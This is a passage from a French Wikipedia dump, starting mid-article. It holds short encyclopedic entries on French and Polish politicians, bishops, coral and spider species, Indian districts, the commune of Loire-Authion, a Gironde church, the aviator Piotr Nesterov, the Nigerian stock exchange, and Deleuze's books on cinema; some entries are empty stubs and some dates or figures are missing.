Henri Félix de Pélissier épouse Marie de Peyrot de Vailhandy, fille du seigneur de Vailhauzy"," le 3 avril 1804 à Millau. Il n'a qu'une unique fille, Marie Anne de Pélissier (1807 - 1865) qui épouse le comte Louis de Combettes du Luc (1811-1856), d'où postérité.

</doc>
<doc id="9624419" url="https://fr.wikipedia.org/wiki?curid=9624419" title="Jean-Baptiste Augustin de Gélis">
Jean-Baptiste Augustin de Gélis

Jean-Baptiste Augustin de Gélis, né le à Lisle-sur-Tarn et mort le dans la même ville, est un homme politique français de la Restauration.
Biographie.
Né le à Lisle-sur-Tarn (Tarn), alors appelée "Lisle-d'Albi", Jean-Baptiste Augustin de Gélis est issu d'une famille noble de la région, implantée depuis le XVe siècle à Lisle. Il est le fils d'Henri-François de Gélis, président trésorier de France en la généralité de Montauban, et de Catherine de Brandouin.
En 1794, il est admis à l'Ecole Centrale des Travaux Publics qui vient d'être fondée, et qui deviendra l'année suivante l'École polytechnique. Il en sortira en 1797.
Monarchiste, il est juge de paix du canton de Lisle-sur-Tarn, et se rallie à la Restauration du pouvoir des Bourbons. 
Après la mort de Pierre de Cardonnel dans l'exercice de ses fonctions, il se présente pour le remplacer dans son mandat de député du Tarn. Il est ainsi élu par le premier arrondissement du Tarn (Albi), le 28 septembre 1829. Il obtient 273 voix sur 429, et bat Marie-Joseph Jacques Bermond. Il siège alors dans la majorité monarchiste, en soutenant le ministère Polignac. Il vote alors contre l'adresse des 221. Son premier mandat se termine le 16 mai 1830.
Néanmoins, il se représente lors des élections législatives de 1830, et il est de nouveau élu le 23 juin 1830 par 303 voix sur 431. Après la révolution de Juillet, il refuse de prêter serment à Louis-Philippe, et est considéré comme démissionnaire à partir du 25 septembre 1830
Il quitte la vie politique, puis meurt le à Lisle-sur-Tarn.
Famille.
Jean-Baptiste de Gélis épouse Pauline Dupuy de Labastide (1777 - 1845), le 17 septembre 1798 à Labastide-Dénat. De cette union naissent :

</doc>
<doc id="9624428" url="https://fr.wikipedia.org/wiki?curid=9624428" title="Foire de la Sainte-Catherine">
Foire de la Sainte-Catherine



</doc>
<doc id="9624430" url="https://fr.wikipedia.org/wiki?curid=9624430" title="(546) Herodias">
(546) Herodias



</doc>
<doc id="9624434" url="https://fr.wikipedia.org/wiki?curid=9624434" title="Claude-René de Thibaut de La Rochethulon">
Claude-René de Thibaut de La Rochethulon



</doc>
<doc id="9624441" url="https://fr.wikipedia.org/wiki?curid=9624441" title="Louis Xavier de Luzines">
Louis Xavier de Luzines

Louis Xavier de Luzines est un homme politique français né le à Versailles (Yvelines) et décédé le à Paizay-le-Sec (Vienne).
Propriétaire, fils d'un ancien valet de chambre du Roi, il est député de la Vienne de 1815 à 1819 siégeant dans la majorité soutenant la Restauration.

</doc>
<doc id="9624443" url="https://fr.wikipedia.org/wiki?curid=9624443" title="Hortense a dit j'm'en f…">
Hortense a dit j'm'en f…

Hortense a dit j'm'en f… est un moyen métrage français réalisé en 1932 par Jean Bernard-Derosne, sorti en 1933, inspiré de la pièce "" de Georges Feydeau.
Synopsis.
Rude journée chez le dentiste Folbraguet et son épouse Marcelle. Tout se serait passé comme d'habitude si seulement Hortense, la bonne, ne s'était avisée de répondre « J'm'en fous » à Madame. Tout le monde s'agite, les patients paniquent et l'infidélité de Folbraguet apparaît au grand jour malgré l'obstination de Marcelle à porter des œillères…

</doc>
<doc id="9624445" url="https://fr.wikipedia.org/wiki?curid=9624445" title="Andrzej Mikosz">
Andrzej Mikosz

Andrzej Mikosz, né le à Poznań, est un avocat et un homme politique polonais proche de la droite.
Biographie.
Formation et carrière.
Diplômé en droit de l'université Adam-Mickiewicz de Poznań, il devient avocat en 1994.
Vie politique.
Il siège à la commission des opérations boursières (KPWiG) entre 1993 et 1996, puis est conseiller du ministre de l'Agriculture de 1998 à 2000. Il est ensuite membre de la commission juridique nationale du Parti conservateur-populaire (SKL).
Le , Andrzej Mikosz est nommé ministre du Trésor d'État dans le gouvernement minoritaire du conservateur Kazimierz Marcinkiewicz. Il démissionne dès le et retourne à sa carrière dans le secteur privé.

</doc>
<doc id="9624449" url="https://fr.wikipedia.org/wiki?curid=9624449" title="Charles Pierre Fradin">
Charles Pierre Fradin

Charles Pierre Fradin est un homme politique français né le à Lusignan (Vienne) et décédé le à Poitiers (Vienne).
Biographie.
Avocat, il est également docteur es lettres et docteur en droit. En 1791, il est professeur de philosophie au collège royal de Poitiers, puis professeur d'histoire à l'école centrale de la Vienne en 1795, puis à la faculté des lettres en 1809.
Il est député de la Vienne de 1819 à 1823, siégeant à gauche dans l'opposition libérale. Il est nommé professeur de droit romain à la faculté de Poitiers en 1829.
Il fait la traduction du géographe antique Pomponius Mela en 1804.

</doc>
<doc id="9624450" url="https://fr.wikipedia.org/wiki?curid=9624450" title="Pierre Guillaume de La Vieuxville (mort en 1727)">
Pierre Guillaume de La Vieuxville (mort en 1727)

Pierre Guillaume de La Vieuxville (né à Saint-Malo en 1667 - mort à Saint-Brieuc le ) est évêque de Saint-Brieuc de 1721 à sa mort.
Biographie.
Pierre Guillaume Levieux, sieur de La Vieuxville ou de La Vieuville-Pourpris est originaire de Saint-Malo. Il est le fils de Joseph Guillaume Levieux, sieur de La Vieuxville, trésorier général des Finances de Bretagne. Chanoine du chapitre de Saint-Malo de 1681 à 1699, il cède cette fonction à Julien Magon. Il est pourvu en commende dès son plus jeune âge en 1681 de l'abbaye Saint-Maurice de Carnoët. Il devient ensuite chanoine puis doyen du chapitre de la cathédrale de Nantes (1701-1721) et est vicaire général. Il reçoit les prieurés de Combourg (diocèse de Saint-Malo) et de Rieux (diocèse de Vannes). En 1721 il est désigné comme évêque de Saint-Brieuc et il est consacré par Armand Bazin de Bezons, archevêque de Rouen. Il préside le États de Bretagne qui siègent dans sa cité épiscopale en 1724 et 1726 et où il instaure une chaire de théologie au collège. Il meurt d'apoplexie en septembre 1727.

</doc>
<doc id="9624460" url="https://fr.wikipedia.org/wiki?curid=9624460" title="District de Buxar">
District de Buxar

Le est un district de l'état du Bihar, en Inde.
Géographie.
Au recensement de 2011, sa population compte habitants.
Son chef-lieu est la ville de Buxar. 

</doc>
<doc id="9624461" url="https://fr.wikipedia.org/wiki?curid=9624461" title="Pierre Guillaume de La Vieuxville (mort en 1734)">
Pierre Guillaume de La Vieuxville (mort en 1734)

Pierre Guillaume de La Vieuxville (né à Paris le - mort le ) est évêque de Bayonne de 1728 à sa mort.
Biographie.
Originaire du diocèse de Saint-Malo, il est le neveu et homonyme de Pierre Guillaume de La Vieuxville, évêque de Saint-Brieuc. Il devient lui aussi chanoine puis doyen du chapitre de Nantes de 1698 à 1728, fonction qu'il résigne en faveur de Louis-Albert Joly de Choin. Docteur en théologie de la Sorbonne en 1710, il devient abbé commendataire de Lahonce. En 1728, il est désigné comme évêque de Bayonne, confirmé le ; il est consacré par le cardinal Henri-Pons de Thiard de Bissy, évêque de Meaux. Il s'oppose fortement au Jansénisme et remplace par l'abbé Jean Daguerre au séminaire les Prêtres de la doctrine chrétienne appelants. Il meurt prématurément dès 1734 .

</doc>
<doc id="9624475" url="https://fr.wikipedia.org/wiki?curid=9624475" title="Lochwinnoch">
Lochwinnoch

Lochwinnoch ("Loch Eanach" en gaélique , "Lochineuch" en scots ) est un village d'Écosse, situé dans le council area et région de lieutenance du Renfrewshire.
Situé sur les bords du et de la , Lochwinnoch est un village-dortoir pour les villes de Paisley et Glasgow.
Le village possède une depuis le , située sur le réseau de l'. Du au , le village a même possédé une sur le réseau de la .
Les ruines du château de sont situées sur le territoire du village.

</doc>
<doc id="9624481" url="https://fr.wikipedia.org/wiki?curid=9624481" title="(220) Stephania">
(220) Stephania



</doc>
<doc id="9624488" url="https://fr.wikipedia.org/wiki?curid=9624488" title="Reservoir Dog">
Reservoir Dog

Reservoir Dog est le septième album studio de Schoolly D, sorti le .
Malgré des critiques plutôt positives, cet album n'a pas été un succès commercial et n'a été classé dans aucun chart.

</doc>
<doc id="9624489" url="https://fr.wikipedia.org/wiki?curid=9624489" title="Palais des Consuls">
Palais des Consuls

Il existe plusieurs bâtiments reprenant ce nom:

</doc>
<doc id="9624495" url="https://fr.wikipedia.org/wiki?curid=9624495" title="The Trump organization">
The Trump organization



</doc>
<doc id="9624496" url="https://fr.wikipedia.org/wiki?curid=9624496" title="Flabellum angulare">
Flabellum angulare

Flabellum angulare est une espèce de coraux appartenant à la famille des Flabellidae.

</doc>
<doc id="9624497" url="https://fr.wikipedia.org/wiki?curid=9624497" title="Réserve naturelle régionale de la Loire bourguignonne">
Réserve naturelle régionale de la Loire bourguignonne

La réserve naturelle régionale de la Loire bourguignonne (RNR304) est une réserve naturelle régionale située en Bourgogne-Franche-Comté. Classée en 2015, elle occupe une surface de et protège un secteur du cours de la Loire.
Localisation.
Le territoire de la réserve naturelle est dans le département de la Nièvre, sur les communes de Charrin, Cossaye, Decize, Devay, Lamenay-sur-Loire, Saint-Hilaire-Fontaine.
Écologie (biodiversité, intérêt écopaysager…).
Le paysage de plaine alluviale sableuse est modelé par le régime fluvial de la Loire. Ces dynamiques particulières façonnent 31 habitats naturels différents dont 13 sont patrimoniaux. De plus, les activités agricoles pastorales participent à la diversification des habitats.
Flore.
La réserve comporte 532 espèces végétales dont 88 sont rares, très rares ou extrêmement rares. Parmi ces raretés à l'échelle de la Bourgogne il y a le Gaillet divariqué et la Renoncule à pinceau. La présence de Piloselle de la Loire, espèce endémique, est recensée.
Faune.
La réserve est le territoire de 22 espèces animales protégées à l'échelle nationale. Il s'agit d'un site de nidification pour des oiseaux nichant sur les grèves tels que l’œdicnème criard, la Sterne pierregarin et la Sterne naine.
Administration, plan de gestion, règlement.
Outils et statut juridique.
La réserve naturelle a été créée par une délibération du Conseil régional du .

</doc>
<doc id="9624498" url="https://fr.wikipedia.org/wiki?curid=9624498" title="Pierre-Longue (Batz-sur-Mer)">
Pierre-Longue (Batz-sur-Mer)



</doc>
<doc id="9624505" url="https://fr.wikipedia.org/wiki?curid=9624505" title="Flabellum angustum">
Flabellum angustum

Flabellum angustum est une espèce de coraux appartenant à la famille des Flabellidae.

</doc>
<doc id="9624506" url="https://fr.wikipedia.org/wiki?curid=9624506" title="Église Saint-Martin de Puisseguin">
Église Saint-Martin de Puisseguin

L'église Saint-Martin est une église catholique située à Puisseguin, dans le département français de la Gironde en France.
Localisation.
L’église est située dans un vallon creusé entre deux coteaux, où s’élevait, à l’est le château de Monbadon et au sud-ouest la maison noble de Jouanin, sur la route départementale D21, entre Lussac et Saint-Cibard.
Description et Historique.
L'église est d'époque romane, sauf pour le portail et l'abside (1761), ainsi que les voûtes (1855). La nef, ainsi que le clocher et le chevet roman ont fait eux l’objet d’une campagne d’embellissement à la fin du . Son plan est simple : une nef unique, le vaisseau est vouté en berceau, divisé en deux travées. À la jonction de l’abside et de la nef s’élève un clocher de plan rectangulaire. Deux forts arcs doubleaux soutiennent le clocher. Elle est suivie d’une abside en hémicycle, vouté en cul-de-four. Cette dernière est éclairée par des baies en plein cintre. Une sacristie est accolée au sud du chevet.
L'église est présente dans la liste des paroisses de l’archiprêtré d’Entre-Dordogne de 1398, sous le nom de "Sanctus Martinus de Boenx". Ce dernier nom ayant été donné par la famille propriétaire du château de Monbadon à l’est de l'église. 
Le chevet actuel est reconstruit au avec deux grandes baies en plein cintre. avec entablement et pilastres ioniques en faux marbre autour de l'autel. La sacristie date de cette campagne.
La nef est voûtée en berceau au . En , la façade de l’église est crépie à la chaux hydraulique, pour préparer la visite de l’archevêque prévue la même année. À cette occasion fut également commandé à l’atelier de l’artiste-peintre Terral des travaux de peinture et de toiles marouflées du chevet. Derrière l’autel, cinq grands panneaux représentent de gauche à droite, saint Martin prêchant devant la foule au pied du château de Monbadon, saint Roch assis avec un vieillard derrière lui, le Christ en croix, la Vierge et l’Enfant, ainsi que saint Martin à cheval tranchant sa cape en deux avec son épée pour en offrir une moitié à un pauvre. Cette dernière représentation du saint est la plus célèbre dans la dévotion populaire et dans la tradition iconographique. Elle évoque la charité de cet ancien soldat, le plus souvent présenté vêtu de son armure et muni de son épée ainsi que de sa cape rouge.
À l'extérieur de l'église, sur la façade sud se trouvent deux types de cadrans solaires. Le plus ancien est un cadran canonial gravé dans la pierre. Un cadran solaire plus moderne se trouve encastré dans le contrefort sud de la façade occidentale. Il porte la date de 1630.
L'édifice est classé au titre des monuments historiques le .

</doc>
<doc id="9624507" url="https://fr.wikipedia.org/wiki?curid=9624507" title="Piotr Nesterov">
Piotr Nesterov

Piotr Nikolaïevitch Nesterov (en ), né le à Nijni Novgorod et décédé le à Jovkva (aujourd'hui en Ukraine), est un voltigeur aérien et aviateur de l’armée de l'air impériale russe. Auteur d’un des premiers loopings, il meurt à la suite d’un taran, un abordage volontaire lors d'un combat aérien d'un avion allemand, au tout début de la Première Guerre mondiale.
Formation.
Piotr Nesterov entame sa formation au corps des cadets de Nijni Novgorod dont il sort en 1904. Il étudie ensuite à l’école d'artillerie Michel (à Saint-Pétersbourg) et est affecté en 1906 à la d’artillerie des fusiliers de Sibérie orientale, à Vladivostok. Il y développe des principes de correction de tir à partir d’un aérostat.
Il s’intéresse à l’aviation et obtient son brevet de pilote de l'école d'aéronautique pour officiers en 1912. En 1913 il est affecté au groupement d’aviation en formation à Kiev. Le , à bord d’un Nieuport IV, Nesterov effectue son premier looping aérien (et peut-être même le premier au monde).
Première Guerre mondiale.
Au début du conflit Nesterov est affecté au front du sud-ouest, participant aux combats autour de Lemberg. Il effectue des vols de reconnaissance et des premiers bombardement avec des obus d’artillerie. Au cours de sa Nesterov, aux commandes d’un Morane-Saulnier G, il attaque un Albatros B.II autrichien en mission de reconnaissance. Souhaitant déstabiliser l'avion ennemi Nesterov se décide à un abordage volontaire mais le choc est tel que les deux avions s'écrasent non loin de Jovkva. Piotr Nesterov, le pilote autrichien Franz Malina et son observateur le baron Friedrich von Rosenthal meurent tous les trois des suites de l'éperonnage.
Honneurs.
À titre posthume Piotr Nesterov reçoit l’ordre de Saint-Georges de le .
De 1951 à 1992 la ville de Jovkva porta le nom de « Nesterov ».

</doc>
<doc id="9624509" url="https://fr.wikipedia.org/wiki?curid=9624509" title="Flabellum aotearoa">
Flabellum aotearoa

Flabellum aotearoa est une espèce de coraux appartenant à la famille des Flabellidae.

</doc>
<doc id="9624513" url="https://fr.wikipedia.org/wiki?curid=9624513" title="Flabellum apertum">
Flabellum apertum

Flabellum apertum est une espèce de coraux appartenant à la famille des Flabellidae.
Liste des sous-espèces.
Selon :

</doc>
<doc id="9624519" url="https://fr.wikipedia.org/wiki?curid=9624519" title="Flabellum arcuatile">
Flabellum arcuatile

Flabellum arcuatile est une espèce de coraux appartenant à la famille des Flabellidae.

</doc>
<doc id="9624520" url="https://fr.wikipedia.org/wiki?curid=9624520" title="District de Madhepura">
District de Madhepura

Le est un district de l'état du Bihar, en Inde.
Géographie.
Au recensement de 2011, sa population compte habitants.
Son chef-lieu est la ville de Madhepura. 

</doc>
<doc id="9624526" url="https://fr.wikipedia.org/wiki?curid=9624526" title="Flabellum areum">
Flabellum areum

Flabellum areum est une espèce de coraux appartenant à la famille des Flabellidae.

</doc>
<doc id="9624527" url="https://fr.wikipedia.org/wiki?curid=9624527" title="3 juin 1855">
3 juin 1855



</doc>
<doc id="9624530" url="https://fr.wikipedia.org/wiki?curid=9624530" title="Ismar David">
Ismar David

Ismar David est un graphiste, illustrateur, calligraphe et créateur de caractères juif-allemand, né à Breslau (aujourd’hui Wrocław en Pologne) le 27 aout 1910 et mort le à New York.

</doc>
<doc id="9624531" url="https://fr.wikipedia.org/wiki?curid=9624531" title="Loire-Authion">
Loire-Authion

Loire-Authion est une commune nouvelle française, située dans le département de Maine-et-Loire, en région Pays de la Loire, créée le .
Géographie.
Localisation.
Elle est située à l'est de l'agglomération d'Angers, dans la partie inférieure de la vallée de l'Authion, depuis la Loire au sud jusqu'aux premières collines du Baugeois au nord.
Son altitude varie de (Brain-sur-l'Authion) à (Bauné).
Communes limitrophes de Loire-Authion
Climat.
Plusieurs études ont été menées afin de caractériser les types climatiques auxquels est exposé le territoire national. Les zonages obtenus diffèrent selon les méthodes utilisées, la nature et le nombre des paramètres pris en compte, le maillage territorial des données et la période de référence. En 2010, le climat de la commune était ainsi de type climat océanique altéré, selon une étude du Centre national de la recherche scientifique (CNRS) s'appuyant sur une méthode combinant données climatiques et facteurs de milieu (topographie, occupation des sols) et des données couvrant la période 1971-2000. En 2020, le climat prédominant est classé Csb, selon la classification de Köppen-Geiger, pour la période 1988-2017, à savoir un climat tempéré à été frais et sec. Par ailleurs Météo-France publie en 2020 une nouvelle typologie des climats de la France métropolitaine dans laquelle la commune est exposée à un climat océanique et est dans la région climatique Moyenne vallée de la Loire, caractérisée par une bonne insolation () et un été peu pluvieux. Elle est en outre dans la zone H2b au titre de la réglementation environnementale 2020 des constructions neuves.
Pour la période 1971-2000, la température annuelle moyenne est de , avec une amplitude thermique annuelle de . Le cumul annuel moyen de précipitations est de , avec de précipitations en janvier et en juillet. Pour la période 1991-2020, la température moyenne annuelle observée sur la station météorologique de Météo-France la plus proche, sur la commune des Bois d'Anjou à à vol d'oiseau, est de et le cumul annuel moyen de précipitations est de . .
Urbanisme.
Typologie.
Au , Loire-Authion est catégorisée bourg rural, selon la nouvelle grille communale de densité à sept niveaux définie par l'Insee en 2022.
Elle appartient à l'unité urbaine de Loire-Authion, une agglomération intra-départementale regroupant cinq communes, dont elle est ville-centre. Par ailleurs la commune fait partie de l'aire d'attraction d'Angers, dont elle est une commune de la couronne. Cette aire, qui regroupe , est catégorisée dans les aires de à moins de .
Logement.
En 2020, le nombre total de logements dans la commune était de , alors qu'il était de en 2014 et de en 2009.
Parmi ces logements, 94,2 % étaient des résidences principales, 1,8 % des résidences secondaires et 3,9 % des logements vacants. Ces logements étaient pour 91,4 % d'entre eux des maisons individuelles et pour 6,5 % des appartements.
Le tableau ci-dessous présente la typologie des logements à Loire-Authion en 2020 en comparaison avec celle du Maine-et-Loire et de la France entière. Une caractéristique marquante du parc de logements est ainsi une proportion de résidences secondaires et logements occasionnels (1,8 %) inférieure à celle du département (3,2 %) et à celle de la France entière (9,7 %). Concernant le statut d'occupation des résidences principales, 77,9 % des habitants de la commune sont propriétaires de leur logement (78,7 % en 2014), contre 60,4 % pour le Maine-et-Loire et 57,5 pour la France entière.
Toponymie.
Le nom de la commune associe ceux des deux cours d'eau qui y jouent un rôle majeur, à savoir, au sud, la Loire et, plus au nord, l'Authion, qui coule parallèlement et draine les basses prairies des anciennes communes.
Histoire.
Créée par un arrêté préfectoral du , elle est issue du regroupement des communes de la communauté de communes de la Vallée-Loire-Authion, à l'exception de la commune de La Ménitré. Ces communes sont celles d'Andard, Bauné, La Bohalle, Brain-sur-l'Authion, Corné, La Daguenière et Saint-Mathurin-sur-Loire qui deviennent des communes déléguées. Le chef-lieu de la commune nouvelle est fixé à Saint-Mathurin-sur-Loire. La Ménitré rejoint la communauté de communes de Beaufort-en-Anjou. La communauté de communes de la Vallée-Loire-Authion est dissoute.
Le schéma départemental de coopération intercommunale de Maine-et-Loire, approuvé le par la commission départementale de coopération intercommunale, envisage l'intégration de "Loire-Authion" dans la communauté urbaine Angers Loire Métropole à partir du . Cette extension est effective le .
Population et société.
Démographie.
Pyramide des âges.
La population de la commune est plus âgée que celle du département. En 2020, le taux de personnes d'un âge inférieur à s'élève à 33,7 %, soit en dessous de la moyenne départementale (36,9 %). Le taux de personnes d'un âge supérieur à (25,6 %) est légèrement inférieur au taux départemental (26,1 %).
En 2020, la commune comptait pour , soit un taux de 50,23 % d'hommes, légèrement supérieur au taux départemental (48,63 %).
Les pyramides des âges de la commune et du département s'établissent comme suit.

</doc>
<doc id="9624532" url="https://fr.wikipedia.org/wiki?curid=9624532" title="Flabellum atlanticum">
Flabellum atlanticum

Flabellum atlanticum est une espèce de coraux appartenant à la famille des Flabellidae.

</doc>
<doc id="9624533" url="https://fr.wikipedia.org/wiki?curid=9624533" title="District de Vaishali">
District de Vaishali

Le est un district de l'État du Bihar en Inde.
Géographie.
Au recensement de 2011, sa population compte habitants.
Son chef-lieu est la ville de Vaishali. 

</doc>
<doc id="9624534" url="https://fr.wikipedia.org/wiki?curid=9624534" title="Satellite d'observation télévision infrarouge">
Satellite d'observation télévision infrarouge



</doc>
<doc id="9624536" url="https://fr.wikipedia.org/wiki?curid=9624536" title="4 janvier 1916">
4 janvier 1916



</doc>
<doc id="9624543" url="https://fr.wikipedia.org/wiki?curid=9624543" title="Troxochrus triangularis">
Troxochrus triangularis

Troxochrus triangularis est une espèce d'araignées aranéomorphes de la famille des Linyphiidae.
Distribution.
Cette espèce est endémique d'Israël.
Description.
Le mâle holotype mesure et la femelle paratype .

</doc>
<doc id="9624544" url="https://fr.wikipedia.org/wiki?curid=9624544" title="Bourse du Nigéria">
Bourse du Nigéria

La Bourse du Nigéria (en anglais: "Nigerian Stock Exchange") (NGX) est la principale bourse du Nigeria. est un groupe boursier intégré en Afrique fondé en 1961 à Lagos. À la suite de la démutualisation de la NSE en 2021, le groupe NGX compte désormais 3 filiales: Nigerian Exchange Limited (NGX), la bourse d'exploitation; NGX Regulation (NGX RegCo, la société de réglementation indépendante; et NGX Real Estate (NGX RelCo). La bourse d'exploitation, NGX, est une bourse multi-actifs avec 393 titres cotés, comprenant 151 sociétés cotées (8 Premium Board, 133 Main Board, 7 Growth Board et 3 sociétés ASeM), 157 titres à revenu fixe, y compris des obligations vertes et des Sukuk (106 FGN, 8 obligations d'État et 43 obligations d'entreprise), 12 produits négociés en bourse, 4 contrats à terme sur indices et 69 cotations Memorandum, au 12 septembre 2024.
Histoire.
La Bourse nigériane a été initialement fondée le 15 septembre 1960 sous le nom de Bourse de Lagos. La bourse est la plus ancienne bourse existante en Afrique de l'Ouest. 
Les opérations ont officiellement débuté le 25 août 1961, avec 19 titres cotés en bourse. Cependant, des opérations informelles avaient commencé plus tôt, en juin 1961. Les opérations étaient initialement menées à l'intérieur du bâtiment de la Banque centrale avec quatre sociétés comme courtiers sur le marché : Inlaks, John Holt, C.T. Bowring et ICON (Société d'investissement du Nigéria). Le volume d'août 1961 était d'environ 80 500 livres et il est passé à environ 250 000 livres en septembre de la même année, la majeure partie des investissements étant constituée de titres d'État. En décembre 1977, elle est devenue connue sous le nom de Bourse nigériane, avec des succursales établies dans certaines des principales villes commerciales du pays.
En 2021, la démutualisation de la NSE a été initiée, ce qui a conduit à l'émergence du Nigerian Exchange Group (NGX Group) Plc et de trois filiales: Nigerian Exchange Limited (NGX), NGX Regulation Limited (NGX RegCo) et NGX Real Estate Limited (NGX RelCo).
Opérations.
Afin d’encourager les investissements étrangers au Nigéria, le gouvernement a aboli la législation empêchant l’entrée de capitaux étrangers dans le pays. Cela a permis aux courtiers étrangers de s’inscrire en bourse et aux investisseurs de toute nationalité d’investir librement. Les sociétés nigérianes sont également autorisées à effectuer des cotations multiples et transfrontalières sur les marchés étrangers.

</doc>
<doc id="9624559" url="https://fr.wikipedia.org/wiki?curid=9624559" title="Tubercithorax subarcticus">
Tubercithorax subarcticus

Tubercithorax subarcticus est une espèce d'araignées aranéomorphes de la famille des Linyphiidae.
Distribution.
Cette espèce est endémique de Russie.
Description.
Le mâle holotype mesure et la femelle paratype .

</doc>
<doc id="9624561" url="https://fr.wikipedia.org/wiki?curid=9624561" title="Rhaebothorax subarcticus">
Rhaebothorax subarcticus



</doc>
<doc id="9624572" url="https://fr.wikipedia.org/wiki?curid=9624572" title="Memling in Sint-Jan de Bruges">
Memling in Sint-Jan de Bruges



</doc>
<doc id="9624574" url="https://fr.wikipedia.org/wiki?curid=9624574" title="Cinéma 1 et Cinéma 2">
Cinéma 1 et Cinéma 2

Cinéma 1 : L'image-mouvement et Cinéma 2 : L'image-temps est un ouvrage du philosophe français Gilles Deleuze paru aux Éditions de Minuit en deux tomes en 1983 et 1985. 
Cet essai tente, en s'appuyant sur l'œuvre d'Henri Bergson, "Matière et mémoire", de développer une analyse des signes, des évènements que produisent les films à travers l'exégèse des films d'Ingmar Bergman, de Robert Bresson, Jean-Luc Godard, Yasujiro Ozu, Orson Welles, etc.
Table des matières.
L'Image-Mouvement (1983)
L'Image-Temps (1985)
Analyse.
Action, réaction.
L'analyse que Deleuze fait du cinéma s'appuie sur l'œuvre d'Henri Bergson, "Matière et mémoire". 
D'un point de vue physiologique et de manière très simplifiée, la perception humaine suit le schème sensori-moteur suivant :
Le cerveau humain est donc fondamentalement l'interface entre des actions reçues et des réactions émises. Il fonctionne toujours selon le principe d'action-réaction.
Contrairement à une idée répandue, nos perceptions ne sont pas de simples copies mentales de notre environnement, c'est-à-dire qu'elles ne se résument pas au signal envoyé par les capteurs au cerveau. C'est ce signal sensoriel traité par le cerveau afin d'envisager les réactions possibles qui constitue notre perception. La perception n'est pas l'action reçue, mais l'ensemble des réponses possibles à cette action.
Habitude et réflexion pure.
Entre l'action et la réaction, il peut s'écouler un laps de temps plus ou moins long.
Dans le cas extrême de l'habitude, la réaction s'enchaîne de manière quasi instantanée avec l'action. Il ne s'agit pas de réflexe, mais lorsqu'une séquence d'action est effectuée souvent, l'enchaînement est bien connu, et peut être réalisé rapidement et sans nécessiter de concentration. Cela permet de gagner en efficacité, en rapidité et libère le cerveau. Un exemple typique est l'apprentissage de la conduite : d'abord éprouvante, elle devient de moins en moins pénible au fur et à mesure que les séquences de mouvements deviennent habituelles. Un autre exemple, sorte d"'effet de bord", est l'écoute d'un disque bien connu, lorsque la fin d'un morceau nous rappelle le début du suivant. La séquence est ici connue par cœur et nous anticipons l'action suivante par habitude.
Mais que se passe-t-il si nous activons la lecture aléatoire ? Le morceau attendu n'est pas joué, remplacé par un autre. Nous sommes perturbés. Et c'est là la limite de l'habitude : elle n'est absolument pas adaptable. Dès lors que l'on se trouve dans une situation peu courante, l'habitude est totalement inefficace. Il faut alors faire appel à sa mémoire, rechercher dans notre passé des expériences pas trop éloignées, capable de nous éclairer sur le choix à faire dans la situation présente. Il faut réfléchir, et cela prend du temps. Nécessairement, le temps entre l'action reçue et la réaction apportée s'étire. À l'extrême limite, ce temps devient infiniment long : c'est la réflexion pure. L’action ne donne plus lieu à une réaction, le schème sensori-moteur est brisé.
Il s'agit de deux extrêmes et le fonctionnement réel du cerveau oscille en permanence entre les deux. Le choix dépend des besoins du moment et du temps disponible. Si j'ai une décision très importante à prendre, je vais prendre le temps de réfléchir, prendre le temps d'étudier les divers arguments. C'est le temps nécessaire à la réflexion qui décide du moment de la réaction : prendre une décision sensée. Mais si je suis dans mon transat et qu'un ballon arc-en-ciel se dirige vers moi, je vais m'écarter rapidement et renverser le cocktail que je tenais à la main : la réaction est rapide mais pas optimale. Si j'avais eu le temps, j'aurais pensé au cocktail et me serais déplacé différemment. Mais voilà, je n'ai pas eu le temps, le danger était trop imminent. Le temps disponible pour la réflexion est contraint par l'urgence de l'action/réaction.
Image-mouvement, image-temps.
Gilles Deleuze illustre la réflexion précédente à travers le cinéma.
De la même manière que le cerveau fonctionne entre deux types extrêmes, on retrouve au cinéma deux grandes images correspondantes. D'un côté l'image-mouvement, qui repose sur le schème sensori-moteur (l’action donne lieu à une réaction). De l'autre l'image-temps, reposant sur la réflexion pure. Dans la première image, l'action décide du temps. Un personnage sort de la pièce - cut - le même personnage est vu en extérieur sortant de chez lui et empruntant la rue. Le plan a été coupé parce que le personnage n'avait plus rien à y faire. C'est l'action (la sortie du personnage) qui arrête le plan et décide de sa durée. Le plan suivant constitue la réaction. Le temps dépend de l’action. : « L’image-mouvement […] nous présente un personnage dans une situation donnée, qui réagit à cette situation et la modifie… Situation sensori-motrice. » L’image-mouvement constitue une grosse majorité des images que nous voyons, et pas seulement des films d’actions. Un simple dispositif d’entrevue avec un journaliste et une personnalité, champ sur le journaliste qui pose sa question, contre-champ sur l’interviewé qui y répond, relève de l’image-mouvement pure et simple.
Mais prenons maintenant le plan suivant : un père part pêcher avec son fils qu’il n’a pas vu depuis longtemps. Ils s’installent sur les berges. Le contact est difficile, ils ne disent rien, ils regardent à l’horizon. Cela dure un certain temps, nettement plus long que le temps nécessaire au spectateur pour comprendre simplement qu’ils pêchent. Cut. Le plan suivant n’a rien à voir. Par exemple, la mère emmène le fils en voiture à la ville. Il n’y a pas de lien de cause à effet entre les deux plans. On ne saurait pas dire si cela se passe avant ou deux heures plus tard ou le mois suivant. Le fait d’aller pêcher n’a donné lieu à aucune réaction, et si le plan avait duré plus longtemps il ne se serait rien passé de nouveau. La durée du plan n'est plus décidée par l'action, le temps est indépendant de l'action. On ne connaît pas le résultat de la pêche et ça n’a aucune importance. Ce plan fait partie de ce que Gilles Deleuze appelle : « une situation optique et sonore pure ». Il est utilisé en particulier dans le « film ballade », dont "Taxi Driver" est un exemple.
Historiquement, le cinéma a commencé par utiliser essentiellement l'image-mouvement. Elle est associée à la logique, à la rationalité. Lors d’un champ-contrechamp entre deux personnages qui se parlent, on n’a pas le choix du moment des coupes : elles suivent les interventions des personnages. À toute question, on attend une réponse cohérente. « On attend », c’est-à-dire que l’on se retrouve dans le cadre de l’habitude, on anticipe non pas forcément le contenu de la réponse, mais au moins qu’une réponse va être donnée et on sait par avance qu’elle surviendra à la fin de la question.
